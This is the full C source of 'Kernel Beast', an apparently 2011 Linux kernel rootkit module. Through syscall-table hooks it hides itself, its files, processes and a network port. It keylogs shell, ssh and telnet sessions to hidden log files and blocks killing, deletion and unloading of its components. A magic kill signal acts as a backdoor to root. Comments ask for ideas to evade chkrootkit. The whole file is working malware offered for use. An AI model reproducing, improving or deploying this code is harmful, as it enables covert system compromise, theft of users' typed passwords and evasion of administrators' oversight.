/*
Kernel Beast Ver #1.0 - Kernel Module
Copyright Ph03n1X of IPSECS (c) 2011
Get more research of ours http://ipsecs.com

Features:
- Hiding this module [OK]
- Hiding files/directory [OK]
- Hiding process [OK]
- Hiding from netstat [OK]
- Keystroke Logging [OK]
- Anti-kill process [OK]
- Anti-remove files [OK]
- Anti-delete modules [OK]
- Local root escalation [OK]
*/

#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/tty.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/file.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <net/tcp.h>
#include "config.h"

#define TIMEZONE 7*60*60	// GMT+7
#define SECS_PER_HOUR   (60 * 60)
#define SECS_PER_DAY    (SECS_PER_HOUR * 24)
#define isleap(year) \
  ((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
#define DIV(a, b) ((a) / (b) - ((a) % (b) < 0))
#define LEAPS_THRU_END_OF(y) (DIV (y, 4) - DIV (y, 100) + DIV (y, 400))
#define TMPSZ 150 //from net/ipv4/tcp_ipv4.c

struct vtm {
  int tm_sec;
  int tm_min;
  int tm_hour;
  int tm_mday;
  int tm_mon;
  int tm_year;
};

MODULE_LICENSE("GPL");

/*Functions*/
int log_to_file(char *);
void get_time(char *);
int epoch2time(const time_t *, long int, struct vtm *);
char *strnstr(const char *, const char *, size_t);
int h4x_tcp4_seq_show(struct seq_file *, void *);

/*Syscalls*/
asmlinkage int (*o_read) (unsigned int, char __user *, size_t);
asmlinkage int (*o_write)(unsigned int, const char __user *, size_t);
#if defined(__x86_64__)
 asmlinkage int (*o_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);
#elif defined(__i386__)
 asmlinkage int (*o_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
#else
 #error Unsupported architecture
#endif
asmlinkage int (*o_unlink)(const char __user *);
asmlinkage int (*o_rmdir)(const char __user *);
asmlinkage int (*o_unlinkat)(int, const char __user *, int);
asmlinkage int (*o_rename)(const char __user *, const char __user *);
asmlinkage int (*o_open)(const char __user *, int, int);
asmlinkage int (*o_kill)(int, int);
asmlinkage int (*o_delete_module)(const char __user *name_user, unsigned int flags);

/*Variable*/
char ibuffer[256];
char obuffer[512];
char spbuffer[4];
char accountlog[32];
int counter=0;

unsigned long *sys_call_table = (unsigned long *)0xc0593150;
int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;

/*
REF : http://commons.oreilly.com/wiki/index.php/Network_Security_Tools/
      Modifying_and_Hacking_Security_Tools/Fun_with_Linux_Kernel_Modules
*/
char *strnstr(const char *haystack, const char *needle, size_t n)
{
  char *s=strstr(haystack, needle);
  if(s==NULL)
    return NULL;
  if(s-haystack+strlen(needle) <= n)
    return s;
  else
    return NULL;
}

/*Ripped from epoch2time() thc-vlogger*/
int epoch2time (const time_t *t, long int offset, struct vtm *tp)
{
  static const unsigned short int mon_yday[2][13] = {
   /* Normal years.  */
   { 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365 },
   /* Leap years.  */
   { 0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366 }
  };

  long int days, rem, y;
  const unsigned short int *ip;

  days = *t / SECS_PER_DAY;
  rem = *t % SECS_PER_DAY;
  rem += offset;
  while (rem < 0) { 
    rem += SECS_PER_DAY;
    --days;
  }
  while (rem >= SECS_PER_DAY) {
    rem -= SECS_PER_DAY;
    ++days;
  }
  tp->tm_hour = rem / SECS_PER_HOUR;
  rem %= SECS_PER_HOUR;
  tp->tm_min = rem / 60;
  tp->tm_sec = rem % 60;
  y = 1970;

  while (days < 0 || days >= (isleap (y) ? 366 : 365)) {
    long int yg = y + days / 365 - (days % 365 < 0);
    days -= ((yg - y) * 365 + LEAPS_THRU_END_OF (yg - 1) - LEAPS_THRU_END_OF (y - 1));
    y = yg;
  }
  tp->tm_year = y - 1900;
  if (tp->tm_year != y - 1900)
    return 0;
  ip = mon_yday[isleap(y)];
    for (y = 11; days < (long int) ip[y]; --y)
      continue;
    days -= ip[y];
    tp->tm_mon = y;
    tp->tm_mday = days + 1;
    return 1;
}

/*Ripped from get_time() thc-vlogger*/
void get_time (char *date_time) 
{
  struct timeval tv;
  time_t t;
  struct vtm tm;
	
  do_gettimeofday(&tv);
  t = (time_t)tv.tv_sec;
	
  epoch2time(&t, TIMEZONE, &tm);

  sprintf(date_time,"%.2d/%.2d/%d-%.2d:%.2d:%.2d", tm.tm_mday,
	tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
	tm.tm_sec);
}

/*
Modified from log_to_file() mercenary code
why don't we modify thc-vlogger? because that'z your job
*/
int log_to_file(char *buffer)
{
  struct file *file = NULL;
  mm_segment_t fs;
  int error;
  
  /*log name*/
  snprintf(accountlog,sizeof(accountlog),"%s/%s.%i",_H4X_PATH_,_LOGFILE_,current_uid());
  file = filp_open(accountlog, O_CREAT|O_APPEND, 00644);
  if(IS_ERR(file)){
    error=PTR_ERR(file);
    goto out;
  }
  
  error = -EACCES;
  if(!S_ISREG(file->f_dentry->d_inode->i_mode))
  goto out_err;
  
  error = -EIO;
  if(!file->f_op->write)
  goto out_err;
  
  error = 0;
  fs = get_fs();
  set_fs(KERNEL_DS);
  file->f_op->write(file,buffer,strlen(buffer),&file->f_pos);
  set_fs(fs);
  filp_close(file,NULL);
  goto out;
    
  out:
	return error;

  out_err:
	filp_close (file,NULL);
	goto out;
}

/*
REF : http://commons.oreilly.com/wiki/index.php/Network_Security_Tools/
      Modifying_and_Hacking_Security_Tools/Fun_with_Linux_Kernel_Modules
*/
int h4x_tcp4_seq_show(struct seq_file *seq, void *v)
{
  int r=old_tcp4_seq_show(seq, v);
  char port[12];

  sprintf(port,"%04X",_HIDE_PORT_);
  if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
    seq->count -= TMPSZ;
  return r;   
}

/*
Modified from hacked sys_read on merecenary code
Why don't we modify thc-vlogger? it's your duty
Somehow this h4x_read doesn't cool enough, but works :) 
*/
asmlinkage int h4x_read(unsigned int fd, char __user *buf, size_t count)
{
  int i,r;
  char date_time[24];
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);

  /*If output is redirected to file or grep, hide it*/
  copy_from_user(kbuf,buf,255);
  if ((strstr(current->comm,"ps"))||(strstr(current->comm,"pstree"))||
      (strstr(current->comm,"top"))||(strstr(current->comm,"lsof"))){
    if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))
    {
      kfree(kbuf);
      return -ENOENT;
    }
  } 
 
  r=o_read(fd,buf,count);
  /*Due to stability issue, we limit the keylogging process*/
  if((strcmp(current->comm,"bash") == 0) || (strcmp(current->comm,"ssh") == 0)||
     (strcmp(current->comm,"scp") == 0) || (strcmp(current->comm,"telnet") == 0)||
     (strcmp(current->comm,"rsh") == 0) || (strcmp(current->comm,"rlogin") == 0)){    
    /*SPECIAL CHAR*/
    if (counter) {
      if (counter == 2) {  // Arrows + Break
        //left arrow
        if (buf[0] == 0x44) {
          strcat(ibuffer,"[LEFT]");
          counter = 0;
          goto END;
        }
        //right arrow
        if (buf[0] == 0x43) {
          strcat(ibuffer,"[RIGHT]");
          counter = 0;
          goto END;
        }
        //up arrow
        if (buf[0] == 0x41) {
          strcat(ibuffer,"[UP]");
          counter = 0;
          goto END;
        }
        //down arrow
        if (buf[0] == 0x42) {
          strcat(ibuffer,"[DOWN]");
          counter = 0;
          goto END;
        }
        //break
        if (buf[0] == 0x50) {
	  strcat(ibuffer,"[BREAK]");
	  counter = 0;
          goto END;
        }
        //numlock
        if(buf[0] == 0x47) {
	  strcat (ibuffer,"[NUMLOCK]");
	  counter = 0;
          goto END;
        }
        strncpy (spbuffer,buf,1);
        counter ++;
        goto END;
      }
  
      if (counter == 3) {   // F1-F5
        //F1
        if (buf[0] == 0x41) {
          strcat(ibuffer,"[F1]");
          counter = 0;
          goto END;
        }
        //F2
        if (buf[0] == 0x42) {
          strcat(ibuffer,"[F2]");
          counter = 0;
          goto END;
        }
        //F3
        if (buf[0] == 0x43) {
          strcat(ibuffer,"[F3]");
          counter = 0;
          goto END;
        }
        //F4
        if (buf[0] == 0x44) {
          strcat(ibuffer,"[F4]");
          counter = 0;
          goto END;
        }
        //F5
        if (buf[0] == 0x45) {
          strcat(ibuffer,"[F5]");
          counter = 0;
          goto END;
        }

        if (buf[0] == 0x7E) {     // PgUp, PgDown, Ins, ...
          //Page Up
          if (spbuffer[0] == 0x35)
            strcat(ibuffer,"[PGUP]");
          //Page Down
          if (spbuffer[0] == 0x36)
            strcat(ibuffer,"[PGDN]");
          //Delete
          if (spbuffer[0] == 0x33)
            strcat(ibuffer,"[DELETE]");
          //End
          if (spbuffer[0] == 0x34)
            strcat(ibuffer,"[END]");
          //Home
          if (spbuffer[0] == 0x31)
            strcat(ibuffer,"[HOME]");
          //Insert
          if (spbuffer[0] == 0x32)
            strcat(ibuffer,"[INSERT]");
          counter = 0;
          goto END;
        }

        if (spbuffer[0] == 0x31) {  // F6-F8
          //F6
          if (buf[0] == 0x37)
            strcat(ibuffer,"[F6]");
          //F7
          if (buf[0] == 0x38)
            strcat(ibuffer,"[F7]");
          //F8
          if (buf[0] == 0x39)
            strcat(ibuffer,"[F8]");
          counter++;
          goto END;
        }
  
        if (spbuffer[0] == 0x32) { // F9-F12
          //F9
          if (buf[0] == 0x30)
            strcat(ibuffer,"[F9]");
          //F10
          if (buf[0] == 0x31)
            strcat(ibuffer,"[F10]");
          //F11
          if (buf[0] == 0x33)
            strcat(ibuffer,"[F11]");
          //F12
          if (buf[0] == 0x34)
            strcat(ibuffer,"[F12]");
  
          counter++;
          goto END;
        }
      }
  
      if(counter >= 4) {  //WatchDog
        counter = 0;
        goto END;
      }
  
      counter ++;
      goto END;
    }
  
    /*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4*/
    if(r==1 && (fd==0||fd==3||fd==4)){
      //CTRL+U
      if(buf[0]==0x15){ 
        ibuffer[0]='\0';
        goto END;
      }
      //TAB
      if(buf[0]==0x09){
        strcat(ibuffer,"[TAB]");
        counter = 0;
        goto END;
      }
      //CTRL+C
      if(buf[0]==0x03){
        strcat(ibuffer,"[CTRL+C]");
        counter = 0;
        goto END;
      }
      //CTRL+D
      if(buf[0]==0x03){
        strcat(ibuffer,"[CTRL+D]");
        counter = 0;
        goto END;
      }
      //CTRL+]
      if(buf[0]==0x1D){
        strcat(ibuffer,"[CTRL+]]");
        counter = 0;
        goto END;
      }
      //BACKSPACE 0x7F Local / 0x08 Remote
      if (buf[0] == 0x7F || buf[0] == 0x08) {
        if (ibuffer[strlen(ibuffer) - 1] == ']') {
          for (i=2;strlen(ibuffer);i++){
            if (ibuffer[strlen (ibuffer) - i] == '[') {
              ibuffer[strlen(ibuffer) - i] = '\0';
              break;
            }
          }
          goto END;
        }else {
          ibuffer[strlen(ibuffer) - 1] = '\0';
          goto END;
        }
      }
  
      if (buf[0] == 0x1B) {
        counter++;
        goto END;
      }
      if(buf[0] != '\n' && buf[0] != '\r'){
        strncat(ibuffer,buf,sizeof(ibuffer));
      }else{
        strcat(ibuffer,"\n");
        get_time(date_time);
        snprintf(obuffer,sizeof(obuffer),"[%s] - [UID = %i ] %s > %s",date_time,current_uid(),current->comm,ibuffer);
	//I don't want to log buffer more than 60 chars, most of them are useless data
        if(strlen(ibuffer)<60) {
          log_to_file(obuffer);
        }
        ibuffer[0]='\0';
      }
    }
  }
  END:
  return r;
}

/*
h4x sys_write to fake output ps, pstree, top, & lsof. If its result redirected to
grep,our process will be displayed, but sysadmin don't know what string should be
grep-ed.
I try to h4x readdir or getdents to completely hide process, but chkrootkit found 
the hidden process, any better idea? comment are welcome.
*/

asmlinkage int h4x_write(unsigned int fd, const char __user *buf,size_t count)
{
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,buf,255);
  if ((strstr(current->comm,"ps"))||(strstr(current->comm,"pstree"))||
      (strstr(current->comm,"top"))||(strstr(current->comm,"lsof"))){
    if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))
    {
      kfree(kbuf);
      return -ENOENT;
    }
  }
  r=(*o_write)(fd,buf,count);
  kfree(kbuf);
  return r;
}

/*
REF : http://freeworld.thc.org/papers/LKM_HACKING.html
Modified for getdents64
*/

#if defined(__x86_64__)
asmlinkage int h4x_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count){
  struct dirent *dir2, *dir3;
  int r,t,n;

  r = (*o_getdents)(fd, dirp, count);
  if(r>0){
    dir2 = (struct dirent *)kmalloc((size_t)r, GFP_KERNEL);
    copy_from_user(dir2, dirp, r);
    dir3 = dir2;
    t=r;
    while(t>0){
      n=dir3->d_reclen;
      t-=n;
      if(strstr((char *) &(dir3->d_name),(char *) _H4X0R_)!=NULL){
        if(t!=0)
          memmove(dir3,(char *) dir3+dir3->d_reclen,t);
        else
          dir3->d_off = 1024;
        r-=n;
      }
      if(dir3->d_reclen == 0){
        r -=t;
        t=0;
      }
      if(t!=0)
        dir3=(struct dirent *)((char *) dir3+dir3->d_reclen);
    }
    copy_to_user(dirp, dir2, r);
    kfree(dir2);
  }
  return r;
}
#elif defined(__i386__)
asmlinkage int h4x_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
  struct linux_dirent64 *dir2, *dir3;
  int r,t,n;

  r = (*o_getdents64)(fd, dirp, count);
  if(r>0){
    dir2 = (struct linux_dirent64 *)kmalloc((size_t)r, GFP_KERNEL);
    copy_from_user(dir2, dirp, r);
    dir3 = dir2;
    t=r;
    while(t>0){
      n=dir3->d_reclen;
      t-=n;
      if(strstr((char *) &(dir3->d_name),(char *) _H4X0R_)!=NULL){
        if(t!=0)
          memmove(dir3,(char *) dir3+dir3->d_reclen,t);
        else
          dir3->d_off = 1024;
        r-=n;
      }
      if(dir3->d_reclen == 0){
        r -=t;
        t=0;
      }
      if(t!=0)
        dir3=(struct linux_dirent64 *)((char *) dir3+dir3->d_reclen);
    }
    copy_to_user(dirp, dir2, r);
    kfree(dir2);
  }
  return r;
}
#else
 #error Unsupported architecture
#endif

/*Don't allow your file to be removed (2.6.18)*/
asmlinkage int h4x_unlink(const char __user *pathname) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,pathname,255);
  if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -EACCES;
  }

  r=(*o_unlink)(pathname);
  kfree(kbuf);
  return r;
}

/*Don't allow your directory to be removed (2.6.18)*/
asmlinkage int h4x_rmdir(const char __user *pathname) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,pathname,255);
  if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -EACCES;
  }
  r=(*o_rmdir)(pathname);
  kfree(kbuf);
  return r;
}

/*Don't allow your file and directory to be removed (2.6.32)*/
asmlinkage int h4x_unlinkat(int dfd, const char __user * pathname, int flag) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,pathname,255);
  if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -EACCES;
  }
  r=(*o_unlinkat)(dfd,pathname,flag);
  kfree(kbuf);
  return r;
}

/*Don't allow your file to be renamed/moved*/
asmlinkage int h4x_rename(const char __user *oldname, const char __user *newname) {
  int r;
  char *oldkbuf=(char*)kmalloc(256,GFP_KERNEL);
  char *newkbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(oldkbuf,oldname,255);
  copy_from_user(newkbuf,newname,255);
  if(strstr(oldkbuf,_H4X0R_)||strstr(newkbuf,_H4X0R_)||strstr(oldkbuf,KBEAST)||strstr(newkbuf,KBEAST)){
    kfree(oldkbuf);
    kfree(newkbuf);
    return -EACCES;
  }
  r=(*o_rename)(oldname,newname);
  kfree(oldkbuf);
  kfree(newkbuf);
  return r;
}

/*Don't allow your file to be overwrited*/
asmlinkage int h4x_open(const char __user *filename, int flags, int mode) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,filename,255);
  //bits/fcntl.h O_WRONLY|O_TRUNC|O_LARGEFILE is 0101001
  if((strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)) && flags == 0101001){
    kfree(kbuf);
    return -EACCES;
  }
  r=(*o_open)(filename,flags,mode);
  return r;
}

/*
Don't allow your process to be killed
Allow local root escalation using magic signal dan pid
*/
asmlinkage int h4x_kill(int pid, int sig) {
  int r;
  struct task_struct *cur;
  cur = pid_task(find_pid_ns(pid, &init_pid_ns), PIDTYPE_PID);
  if(cur){
    if(strstr(cur->comm,_H4X0R_)||strstr(cur->comm,KBEAST)){
      return -EACCES;
    }
  }
  if(sig == _MAGIC_SIG_ && pid == _MAGIC_PID_){
    struct cred *new=prepare_creds();if(new){new->uid=0;new->euid=0;new->gid=0;new->egid=0;commit_creds(new);return 0;}
    return 0;
  } 
  r = (*o_kill)(pid,sig);
  return r;
}

asmlinkage int h4x_delete_module(const char __user *name_user, unsigned int flags){
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,name_user,255);
  if(strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -EACCES;
  }
  r=(*o_delete_module)(name_user, flags);
  return r;
}

/*init module insmod*/
static int init(void)
{
  //Uncomment to hide this module
  list_del_init(&__this_module.list);

  struct tcp_seq_afinfo *my_afinfo = NULL;
  //proc_net is disappeared in 2.6.32, use init_net.proc_net
  struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;  

  write_cr0 (read_cr0 () & (~ 0x10000));
  if(_KEYLOG_){
    o_read=(void *)sys_call_table[__NR_read];
    sys_call_table[__NR_read]=h4x_read;
  }
  o_write=(void *)sys_call_table[__NR_write];
  sys_call_table[__NR_write]=h4x_write;
  #if defined(__x86_64__)
    o_getdents=sys_call_table [__NR_getdents];
    sys_call_table [__NR_getdents]=h4x_getdents;
  #elif defined(__i386__)
    o_getdents64=sys_call_table [__NR_getdents64];
    sys_call_table [__NR_getdents64]=h4x_getdents64;
  #else
    #error Unsupported architecture
  #endif
  o_unlink = sys_call_table [__NR_unlink];
  sys_call_table [__NR_unlink] = h4x_unlink;
  o_rmdir = sys_call_table [__NR_rmdir];
  sys_call_table [__NR_rmdir] = h4x_rmdir;
  o_unlinkat = sys_call_table [__NR_unlinkat];
  sys_call_table [__NR_unlinkat] = h4x_unlinkat;
  o_rename = sys_call_table [__NR_rename];
  sys_call_table [__NR_rename] = h4x_rename;
  o_open = sys_call_table [__NR_open];
  sys_call_table [__NR_open] = h4x_open;
  o_kill = sys_call_table [__NR_kill];
  sys_call_table [__NR_kill] = h4x_kill;
  o_delete_module = sys_call_table [__NR_delete_module];
  sys_call_table [__NR_delete_module] = h4x_delete_module;
  write_cr0 (read_cr0 () | 0x10000);

  while(strcmp(my_dir_entry->name, "tcp"))
    my_dir_entry = my_dir_entry->next;
  if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
  {
    //seq_show is disappeared in 2.6.32, use seq_ops.show
    old_tcp4_seq_show = my_afinfo->seq_ops.show;
    my_afinfo->seq_ops.show = h4x_tcp4_seq_show;
  }
  return 0;
}

/*delete module rmmod*/
static void exit(void)
{
  struct tcp_seq_afinfo *my_afinfo = NULL;
  //proc_net is disappeared 2.6.32, use init_net.proc_net
  struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;

  write_cr0 (read_cr0 () & (~ 0x10000));
  if(_KEYLOG_){
    sys_call_table[__NR_read]=o_read;
  }
  sys_call_table[__NR_write]=o_write;
  #if defined(__x86_64__)
    sys_call_table[__NR_getdents] = o_getdents;
  #elif defined(__i386__)
    sys_call_table[__NR_getdents64] = o_getdents64;
  #else
    #error Unsupported architecture
  #endif
  sys_call_table[__NR_unlink] = o_unlink;
  sys_call_table[__NR_rmdir] = o_rmdir;
  sys_call_table[__NR_unlinkat] = o_unlinkat;
  sys_call_table[__NR_rename] = o_rename;
  sys_call_table[__NR_open] = o_open;
  sys_call_table[__NR_kill] = o_kill;
  sys_call_table[__NR_delete_module] = o_delete_module;
  write_cr0 (read_cr0 () | 0x10000);

  while(strcmp(my_dir_entry->name, "tcp"))
    my_dir_entry = my_dir_entry->next;
  if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data))
  {
    //seq_show is disappeared in 2.6.32, use seq_ops.show
    my_afinfo->seq_ops.show=old_tcp4_seq_show;
  }
  return;
}

module_init(init);
module_exit(exit);
